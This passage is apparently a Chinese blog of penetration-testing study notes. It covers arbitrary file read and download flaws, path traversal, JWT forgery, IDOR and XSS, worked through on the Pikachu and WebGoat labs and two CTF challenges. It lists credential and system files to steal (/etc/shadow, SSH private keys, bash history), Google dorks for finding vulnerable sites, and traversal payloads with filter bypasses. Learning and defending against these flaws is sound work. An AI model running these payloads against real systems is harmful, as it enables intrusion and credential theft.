信息收集信息-》猜路径-》下载配置文件、代码文件-》利用服务器软件漏洞-》shell-》提权<br>
首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径，然后根据收集到的信息，下载配置，如weblogic，ftp，ssh等，根据下载到的配置文件进行渗透<br>
1.读取程序源代码（如密码配置文件）<br>
2.读取程序配置文件（如数据库连接文件）<br>
如webloginc，ssh，ftp，数据库配置文件等，当接触密码后进行登录，getshell<br>
3。读取操作系统关键文件（如/etc/sadow,/root/.bash_history等文件）<br>
4.读取运维配置文件（redis/rsync/ftp/ssh客户端数据等）<br>
5.读取中间件配置文件（weblogic、tomcat，密码文件，apache的httpd.conf文件）<br>
6.下载web日志文件（获取网站后台、上传文件等）<br>
下载日志文案金，找到登录、上传。后台，操作，找到登录入口可以爆破，测试默认口令，弱口令，找到文件上传点则测试文件上传漏洞找到后台操作<br>
7，结合ssrf获取内网机器文件<br>
8.可以利用../返回到上级目录下载敏感文件</p>
<p><strong>系统文件</strong><br>
<strong>window</strong></p>
<pre><code>C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase. xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user. MYD  //Mysql root 
C:\Windows\php.ini //php配置信息 
C:\Windows\my.ini //Mysql配置信息
</code></pre>
<p><strong>Linux</strong></p>
<pre><code>.bash_history` # 历史中可能带着用户的密码 ( 遇到过现实案例,是输错的情况下参数的,比如没 输入 su 却以为自己输了 su)
/etc/passwd # 用户情况 
/etc/shadow # 直接 John the Ripper 
/etc/hosts # 主机信息，通常配置了一些内网 域名
/root/.bash_history //root的bash历史记录
/root/.ssh/authorized_keys /root/.mysql_history //mysql的bash历史记录
/root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx的配置文件
/var/www/html/index.html /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd的配置文件
/proc/self/fd/fd[0-9]*(文件标识符) 
/proc/mounts /porc/config.gz /proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用 
/proc/mounts // 挂载的文件系统列表 
/proc/net/arp //arp表，可以获得内网其他机器的地址
/proc/net/route //路由表信息 
/proc/net/tcp and /proc/net/udp // 活动连接的信息
/proc/net/fib_trie // 路由缓存
/proc/version // 内核版本
/proc/[PID]/cmdline // 可能包含有用的路径信息
/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell
/proc/[PID]/cwd // 当前进程的工作目录
/proc/[PID]/fd/[#] // 访问file descriptors， 某写情况可以读取到进程正在使用的文件，比如 access.log /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /etc/ssh/sshd_config /var/log/secure /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/syscomfig/network-scripts/ifcfg-eth1
/usr/local/tomcat/conf/tomcat-users. xml # tomcat 用户配置文件 
/root/.bashrc # 环境变量 
/root/.bash_history # 还有root外的其他用户
/root/.viminfo # vim 信息
/root/.ssh/id_rsa # 拿私钥直接ssh 
/proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite 数据库 config 文件     web 日志 access.log, error.log /var/lib/php/sess_PHPSESSID # 非常规问题 session 文件 
/proc/net/arp /proc/net/tcp /proc/net/udp /proc/net/dev
</code></pre>
<p><strong>常见脚本敏感文件参考</strong></p>
<pre><code>PHP： inc/config. php获得数据库连接字符串中的口令信息
asp： inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。
aspx： web.config网站根目录文件，获得数据库连接信息。
JSP： conf/ tomcat-user.xml文件，获得tomcat管理界面的口令信息
WEB- INF /Web. xml文件,获得数据库连接字符串中的口令信息。
</code></pre>
<p><strong>任意文件读取</strong></p>
<pre><code>&lt;?php
$filename = &quot;test.txt&quot;;
readfile($filename);
?&gt;

&lt;?php
$filename = &quot;test.txt&quot;;
$fp = fopen($filename,&quot;r&quot;) or die(&quot;Unable to open file!&quot;);
$data = fread($fp,filesize($filename));
fclose($fp);
echo $data;
?&gt;

&lt;?php
$filename = &quot;test.txt&quot;;
echo file_get_contents($filename);
?&gt;
</code></pre>
<p><strong>任意文件下载</strong><br>
直接下载：</p>
<pre><code>&lt;a href=&quot;http://www.xx.com/a.zip&quot;&gt;Download&lt;/a&gt;
</code></pre>
<p><strong>用header()下载：</strong></p>
<pre><code>&lt;?php
$filename = &quot;uploads/201607141437284653.jpg&quot;;
header('Content-Type: imgage/jpeg');
header('Content-Disposition: attachment; filename='.$filename);
header('Content-Lengh: '.filesize($filename));
?&gt;
</code></pre>
<p><strong>Google search</strong></p>
<pre><code>inurl:&quot;readfile.php?file=&quot;
inurl:&quot;read.php?filename=&quot;
inurl:&quot;download.php?file=&quot;
inurl:&quot;down.php?file=&quot;
</code></pre>
<p>等等...</p>
<p><strong>漏洞利用代码</strong></p>
<pre><code>readfile.php?file=/etc/passwd
readfile.php?file=../../../../../../../../etc/passwd
readfile.php?file=../../../../../../../../etc/passwd%00

1.文件被解析，则是文件包含漏洞
2.显示源代码，则是文件读取漏洞
3.提示文件下载，则是文件下载漏洞
</code></pre>
<p><strong>漏洞挖掘</strong><br>
可以用Google hacking或Web漏洞扫描器<br>
从链接上看，形如：</p>
<pre><code>• readfile.php?file=***.txt
• download.php?file=***.rar
</code></pre>
<p>从参数名看，形如：</p>
<pre><code>• &amp;RealPath= 
• &amp;FilePath= 
• &amp;ﬁlepath= 
• &amp;Path= 
• &amp;path= 
• &amp;inputFile= 
• &amp;url= 
• &amp;urls= 
• &amp;Lang= 
• &amp;dis= 
• &amp;data= 
• &amp;readﬁle= 
• &amp;ﬁlep= 
• &amp;src= 
• &amp;menu= 
• META-INF 
• WEB-INF
目录符号等
../ ..\ .\ ./等
%00 ? %23 %20 .等
</code></pre>
<p><strong>漏洞验证</strong></p>
<pre><code>• index.php?f=../../../../../../etc/passwd 
• index.php?f=../index.php 
• index.php?f=ﬁle:///etc/passwd
注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，
若显示源码或提示下载则是文件查看与下载漏洞
</code></pre>
<p><strong>漏洞防范</strong></p>
<p>任意文件下载漏洞的简单防护措施<br>
1、过滤“.”符号，使用户在url中无法回溯到上级目录。<br>
2、使用正则表达式严格判断用户输入参数的格式。<br>
3、php.ini配置文件中对于open_basedir进行配置，限定用户的文件访问范围。<br>
4、固定目录</p>
<p><strong>案例</strong><br>
pikuchu靶场-文件下载测试<br>
1、判断是否为文件上传漏洞<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634368609922.png" alt="" loading="lazy"><br>
点击任意图片，发现下载了图片，复制图片下载链接查看</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png
</code></pre>
<p>查看参数名为filename，查看参数后面的值也与下载的文件名一样<br>
初步判定为文件上传漏洞</p>
<p><strong>2、判断下载路径</strong><br>
filename的文件名是单纯的文件名，可判断是前面加了路径名，也可能是与网站在同一个目录下<br>
通过URL判断文件是通过跳转到execdownload.php页面下载的，我们试试看可不可以直接下载到execdownload.php这个源码</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=execdownload.php
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634368614384.png" alt="" loading="lazy"><br>
发现显示无法下载，说明该execdownload.php与文件不在同一个路径下，我们尝试下到上一级路径</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=../execdownload.php
</code></pre>
<figure data-type="image" tabindex="102"><img src="https://jinqipiaopiao.github.io//post-images/1634368618360.png" alt="" loading="lazy"></figure>
<p>成功下载，打开源码发现是在download文件夹下</p>
<figure data-type="image" tabindex="103"><img src="https://jinqipiaopiao.github.io//post-images/1634368621682.png" alt="" loading="lazy"></figure>
<p>说明文件下载路径的文件夹与down_nba.php是同一级路径<br>
<strong>3、尝试下载敏感文件（以下路径均通过扫描路径得到）</strong><br>
pikachu-master/inc/config.inc.php<br>
当前下载路径：<br>
pikachu-master/vul/unsafedownload/download/xxx.xxx<br>
与vul相差3个父目录，所以加3个…/<br>
完整url：</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=…/…/…/inc/config.inc.php
</code></pre>
<p>下载成功，打开发现里面存在数据库相关的配置文件</p>
<figure data-type="image" tabindex="104"><img src="https://jinqipiaopiao.github.io//post-images/1634368626288.png" alt="" loading="lazy"></figure>
<p><strong>小米路由器-文件读取真实测试-漏洞</strong><br>
复现</p>
<p><strong>RoarCTF2019-文件读取真题复现</strong><br>
wp<br>
首先看到一个页面,点击下help看看啥情况。</p>
<figure data-type="image" tabindex="105"><img src="https://jinqipiaopiao.github.io//post-images/1634368638550.png" alt="" loading="lazy"></figure>
<p>发现输出一串</p>
<pre><code>java.io.FileNotFoundException:{help.docx}
</code></pre>
<p>是文件无法找到的异常信息</p>
<figure data-type="image" tabindex="106"><img src="https://jinqipiaopiao.github.io//post-images/1634368649119.png" alt="" loading="lazy"></figure>
<p>查询资料发现：</p>
<pre><code>WEB-INF/web.xml泄露
WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件
</code></pre>
<p>漏洞成因：</p>
<pre><code>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！
</code></pre>
<p><strong>根据上文，我们先找一下WEB-INF/web.xml,POST传值</strong></p>
<figure data-type="image" tabindex="107"><img src="https://jinqipiaopiao.github.io//post-images/1634368655474.png" alt="" loading="lazy"></figure>
<p>得到WEB-INF/web.xml文件，打开</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
version=&quot;4.0&quot;&gt;

&lt;welcome-file-list&gt;
&lt;welcome-file&gt;Index&lt;/welcome-file&gt;
&lt;/welcome-file-list&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;/web-app&gt;
</code></pre>
<p>我们可以看到com.wm.FlagController，</p>
<pre><code>&lt;servlet&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
&lt;/servlet&gt;
</code></pre>
<p>servlet-class里面的.代表的是路径/<br>
然后下载FlagController.class文件试一试</p>
<pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
</code></pre>
<p>打开文件发现一串base编码，进行base64解密得到flag</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634368663365.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634368667761.png" alt="" loading="lazy"><br>
https://www.cnblogs.com/yanze/p/10457924.html<br>
https://www.runoob.com/servlet/servlet-tutorial.html<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634368672510.png" alt="" loading="lazy"></p>
<p><strong>百度杯2017二月-Zone真题复现</strong></p>
<p>1、 尝试burp抓包发现cookie中有个login，值为0，将0改为1后在访问首页，发现可以正常登入</p>
<figure data-type="image" tabindex="108"><img src="https://jinqipiaopiao.github.io//post-images/1634368678409.png" alt="" loading="lazy"></figure>
<p>2、单击 “manage” （此时还是需要用burp改login的值），点击框框发现比较特殊的url；猜测可能存在文件包含或者下载、读取</p>
<figure data-type="image" tabindex="109"><img src="https://jinqipiaopiao.github.io//post-images/1634368682044.png" alt="" loading="lazy"></figure>
<p>3、测试访问url: xxxxxx.com/manages/admin.php?module=ind…/ex&amp;name=php 页面可以正常访问,猜测过滤了一遍…/再试一试绕过 url:url: xxxxxx.com/manages/admin.php?module=ind…/./ex&amp;name=php 访问不正常；<br>
说明过滤机制只是把…/进行了一次过滤，所以我们双写…/即可</p>
<p>4、访问测试任意文件读取判断路径通过不断加…/ url:?module=…/./…/./…/./etc/passwd&amp;name<br>
（用户情况文件）</p>
<figure data-type="image" tabindex="110"><img src="https://jinqipiaopiao.github.io//post-images/1634368686754.png" alt="" loading="lazy"></figure>
<p>5、查看下服务器是nginx。找一下它的配置文件，根据信息读取配置文件， url: manages/admin.php?module=…/./…/./…/./etc/nginx/nginx.conf 获得关键文件sites-enabled/default 并进行读取</p>
<figure data-type="image" tabindex="111"><img src="https://jinqipiaopiao.github.io//post-images/1634368691861.png" alt="" loading="lazy"></figure>
<p>module=…/./…/./…/./etc/nginx/sites-enabled/default&amp;name=获得web文件路径online-movies 并访问</p>
<figure data-type="image" tabindex="112"><img src="https://jinqipiaopiao.github.io//post-images/1634368696434.png" alt="" loading="lazy"></figure>
<p>6、发现可以利用的漏洞，因为有一个autoindex on也就是开启了目录遍历，我们可以访问这个/online-movies/，访问出现如下，再点击…/发现要进行验证，把login改为1后页面空白，我通过百度发现要/online-movies/…才能遍历（不清楚为什么）</p>
<figure data-type="image" tabindex="113"><img src="https://jinqipiaopiao.github.io//post-images/1634368702166.png" alt="" loading="lazy"></figure>
<p>7、访问/online-movies…/</p>
<figure data-type="image" tabindex="114"><img src="https://jinqipiaopiao.github.io//post-images/1634368707333.png" alt="" loading="lazy"></figure>
<p>8、地址为:online-movies…/var/www/html/flag.php构造url下载到flag.php获得flag</p>
<h1 id="2021-10-17">2021-10-17</h1>
<h1 id="jwt安全及预编译case注入40-41">JWT安全及预编译case注入（40-41）</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634470535618.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634470540122.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634470543718.png" alt="" loading="lazy"></p>
<p>什么时JWT？<br>
Json Web Token(JSON Web令牌)是一种跨域验证身份的方案。JWT不加密传输的数据，但能够通过数字签名来验证数据未被篡改（但是昨晚下面的WebGoat练习后我对这一点表示怀疑）。<br>
JWT分为三部分，头部（header），声明（Claims），签名（Signature），三个部分以英文句号，隔开。Jwt的内容以Base64URL进行了编码。</p>
<pre><code>头部（header）
{
&quot;alg&quot;:&quot;HS256&quot;;
&quot;typ&quot;:&quot;JWT&quot;
}
</code></pre>
<p>alg是说明这个JWT签名使用的算法的参数，常见值用HS256（默认），HS512等，也可以为none，hs256表示hmac sha256<br>
typ说明这个token的类型为JWT</p>
<p>声明（Claims）</p>
<pre><code>{
&quot;exp&quot;:1416471934,
&quot;user_name&quot;:&quot;user&quot;,
&quot;scope&quot;:[
&quot;read&quot;,
&quot;write&quot;   
],
&quot;authorities&quot;: [
&quot;ROLE_ADMIN&quot;,
&quot;ROLE_USER&quot;
],
&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,
&quot;client_id&quot;: &quot;my-client-with-secret&quot;
}

JWT 固定参数有：

iss：发行人
exp：到期时间
sub：主题
aud：用户
nbf：在此之前不可用
iat：发布时间
jti：JWT ID 用于标识该 JWT
</code></pre>
<p>签名（Signature）<br>
服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。<br>
下面是一个用 HS256 生成 JWT 的代码例子<br>
HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload),secret)</p>
<p>1、用户端登录，用户名和密码在请求中被发往服务器<br>
2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。<br>
3、服务器将 JWT（通过响应）返回给客户端<br>
4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>
5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>
6、服务器返回响应</p>
<figure data-type="image" tabindex="115"><img src="https://jinqipiaopiao.github.io//post-images/1634471701524.png" alt="" loading="lazy"></figure>
<p>40.1 JWT</p>
<figure data-type="image" tabindex="116"><img src="https://jinqipiaopiao.github.io//post-images/1634471705966.png" alt="" loading="lazy"></figure>
<p>40.2 身份验证攻击-JWT修改伪造</p>
<figure data-type="image" tabindex="117"><img src="https://jinqipiaopiao.github.io//post-images/1634471711682.png" alt="" loading="lazy"></figure>
<p>接上部分，产生歧义的”=“，”+“，”/“需要删除；<br>
而第一部分说明的加密方法是none，所以第三部分为空就好。</p>
<p><strong>40.3 SQL Injection(mitigation)</strong><br>
防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。<br>
利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;'&quot; + session.getAttribute(&quot;UserID&quot;) + &quot;'&quot;;<br>
参数绑定方式，利用了 sql 的预编译技术</p>
<pre><code>String query = &quot;SELECT * FROM users WHERE last_name = ?&quot;;
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, accountName);
ResultSet results = statement.executeQuery();
</code></pre>
<p>上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。<br>
参数绑定方式可以使用下面方式绕过。<br>
通过使用 case when语句可以将 order by后的 orderExpression表达式中添加select语句。</p>
<p><strong>40.4 Java代码审计入门：WebGoat8</strong><br>
参考：https://www.freebuf.com/vuls/216457.html</p>
<p><strong>涉及资源</strong><br>
https://jwt.io/#encoded-jwt<br>
https://www.ctfhub.com/#Ichallenge<br>
https:/www.zhihu.com/question/43581628<br>
https://www.freebuf.com/vuls/216457.html<br>
https://www.cnblogs.com/klyjb/p/11473857.html</p>
<p><strong>41. 目录遍历访问控制XSS等安全问题</strong><br>
本次直播注重代码分析，熟悉 javaweb 开发结构，掌握 javaweb 代码审计流程，其次才是相关漏洞解释（因前期漏洞原理已基本讲解完<br>
毕），通过本次直播大家务必学会分析相关代码路径，结构，框架等知识点。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634471718234.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634471721961.png" alt="" loading="lazy"><br>
涉及资源<br>
https://pan.baidu.com/s/19-w0GeDVYvHH6yRz9cNpGw oms7</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「进击的网安攻城狮」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_41665162/article/details/119790421</p>
<h1 id="2021-10-18">2021-10-18</h1>
<h1 id="java-安全-目录遍历访问控制-xss-等安全问题">JAVA 安全 - 目录遍历访问控制 XSS 等安全问题</h1>
<p><strong>Javaweb 路径遍历</strong><br>
靶场：webgoat-Path traversal（路径遍历）<br>
路径（目录）遍历是一种漏洞，攻击者可以通过该漏洞访问或存储应用程序运行位置之外的文件和目录。这可能会导致从其他目录读取文件，以及在文件上传覆盖关键系统文件的情况下。</p>
<p>第一关<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530825006.png" alt="" loading="lazy"></p>
<p>文件上传配合目录遍历 覆盖文件自定义文件存储地址-基于用户名存储问题<br>
在此关卡中，目标是覆盖文件系统上的特定文件。当然，WebGoat 关心用户，因此您需要将文件上传到正常上传位置之外的以下位置，得知他的任务是将文件上传到webgoat指定的其他目录上</p>
<p>1、随便上传一个文件抓包查看：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530828902.png" alt="" loading="lazy"></p>
<p>2、抓包放行后,得到存储路径<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530833241.png" alt="" loading="lazy"></p>
<p>3、可以看出是将fullName作为文件的上一目录上传，即\username\fullname\文件名<br>
4、故我们尝试通过…/存储到上一路径<br>
5、将fullname改为…/test<br>
6、放行，成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530845195.png" alt="" loading="lazy"></p>
<p>7、白盒审计<br>
POST、GET、@RequestBody和@RequestParam区别<br>
@RequestParam有三个配置参数：<br>
required 表示是否必须，默认为 true，必须。<br>
defaultValue 可设置请求参数的默认值。<br>
value 为接收url的参数名（相当于key值）。</p>
<p>关键代码：</p>
<pre><code>@ResponseBody
public AttackResult uploadFileHandler(@RequestParam(&quot;uploadedFile&quot;) MultipartFile file, @RequestParam(value = &quot;fullName&quot;, required = false) String fullName) {
return super.execute(file, fullName);
}
</code></pre>
<p>预防：<br>
目录解析</p>
<p>springframework javaweb的spring框架，类似于php的phpthink框架</p>
<p><strong>第二关</strong></p>
<figure data-type="image" tabindex="118"><img src="https://jinqipiaopiao.github.io//post-images/1634530853170.png" alt="" loading="lazy"></figure>
<p>同样的任务，只是用了一个replace将…/去掉而已，双写即可<br>
Payload: …//x<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530857955.png" alt="" loading="lazy"></p>
<p>白盒审计：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530862446.png" alt="" loading="lazy"><br>
过滤fullName中的…/一次</p>
<p>第三关<br>
可知不对fullname验证</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530867865.png" alt="" loading="lazy"><br>
发现fullname赋值为什么，最终都是test</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530873197.png" alt="" loading="lazy"><br>
抓包查看，修改filename，在前面加…/</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530879676.png" alt="" loading="lazy"><br>
成功</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530884436.png" alt="" loading="lazy"><br>
<strong>第四关</strong><br>
这关要求找到名叫path-traversal-secret.jpg的文件。</p>
<p>1、先点一下show random cat picture按钮，burpsuite抓包</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530898968.png" alt="" loading="lazy"><br>
2、请求包没有什么有用的数据，放行查看响应包</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530903497.png" alt="" loading="lazy"><br>
3、而任务是想让我们尝试找到一个名为path-traversal-secret.jpg，</p>
<p>4、像下图这样random-picture后面增加?id=1.jpg，发送报文之后，响应404 Not Found，发现服务器查找的文件名在id的值后面加上了.jpg。所以如果要查看1.jpg的内容，应该在random-picture后面增加?id=1</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530964176.png" alt="" loading="lazy"><br>
接下来可以试试random-picture后面增加?id=path-traversal-secret<br>
结果返回了400 Bad Request<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530991941.png" alt="" loading="lazy"></p>
<p>再试试random-picture后面增加?id=…/path-traversal-secret</p>
<p>也返回了400 Bad Request，而且提示请求参数中有非法字符<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530998617.png" alt="" loading="lazy"></p>
<p>把上述payload中的<code>…/改为%2e%2e%2f（…/的url编码）</code><br>
还是返回400 Bad Request，但是不提示有非法字符了。<br>
那再往上一级目录看看，<code>?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret</code><br>
从返回结果来看，已经找到要找的文件了。<br>
提示用户名的SHA-512 hash就是本题的答案<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531003811.png" alt="" loading="lazy"></p>
<p>网上搜一下SHA512在线，然后把用户名进行SHA512 hash<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531010130.png" alt="" loading="lazy"></p>
<p>将得到的结果填入小旗子后面的输入框，submit secret即可通过本关<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531015840.png" alt="" loading="lazy"></p>
<p><strong>Javaweb 代码分析-前端验证安全问题</strong><br>
不安全登录 Insecure Login-基于前端认证<br>
1、页面提示单击登录抓包<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531042455.png" alt="" loading="lazy"></p>
<p>2、得到用户和密码，登录通过<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531048397.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531053660.png" alt="" loading="lazy"></p>
<p><strong>1、黑盒测试查看源代码发现是js判断，关闭js即可</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531061121.png" alt="" loading="lazy"></p>
<p><strong>2、白盒测试，查看函数，发现有16进制，解码后是账号密码</strong><br>
16进制转换网页<br>
转换前把\x去掉</p>
<figure data-type="image" tabindex="119"><img src="https://jinqipiaopiao.github.io//post-images/1634531079962.png" alt="" loading="lazy"></figure>
<p><strong>3、白盒测试，查看submit点击的源代码</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531085935.png" alt="" loading="lazy"></p>
<p><strong>Javaweb 代码分析-逻辑越权安全问题</strong><br>
代码分析过关逻辑<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531093017.png" alt="" loading="lazy"></p>
<p>此题目是为了说明请求返回的包里可能包含了更多的内容。此题目要求将response包返回的所有参数比界面上View Profile中显示的多的几个参数，具体如下。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531099341.png" alt="" loading="lazy"></p>
<p><strong>枚举用户参数对应数据库的其他数据信息</strong><br>
role,userid<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531104024.png" alt="" loading="lazy"></p>
<p><strong>url接口</strong><br>
在Stage 3中知道了tom的userId是2342384。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531108907.png" alt="" loading="lazy"></p>
<pre><code>{
&quot;role&quot; : 3,
&quot;color&quot; : &quot;yellow&quot;,
&quot;size&quot; : &quot;small&quot;,
&quot;name&quot; : &quot;Tom Cat&quot;,
&quot;userId&quot; : &quot;2342384&quot;
}
</code></pre>
<p>该题目就是通过路由访问tom的配置信息，在输入框里输入WebGoat/IDOR/profile/2342384，就通过了此题目。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531114557.png" alt="" loading="lazy"></p>
<p><strong>白盒测试</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531120951.png" alt="" loading="lazy"></p>
<p>通过参数值构造 URL 获取用户更多的信息<br>
<strong>WebGoat/IDOR/profile/2342384</strong></p>
<p>Javaweb 代码分析-XSS 跨站安全问题<br>
XSS 跨站<br>
代码分析结合页面解释过关<br>
第2关：yes</p>
<p>第7关：修改card number + 绕过黑名单<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531125571.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531129816.png" alt="" loading="lazy"></p>
<p><strong>拓展-安卓 APP 反编译 JAVA 代码</strong><br>
#核心知识点：Java 代码分析 === Apk_App 分析<br>
模块引用（框架,自带等），路由地址，静态文件（html.js 等）,简易代码理解等</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/120032501</p>
<h1 id="2021-10-19">2021-10-19</h1>
<p>#42. 操作系统之漏洞探针类型利用修复（42-45）</p>
<p>相关名词解释：</p>
<p>CVSS（Common Vulnerability Scoring System，即“通用漏洞评分系统”）</p>
<p>CVSS是安全内容自动化协议（SCAP）的一部分<br>
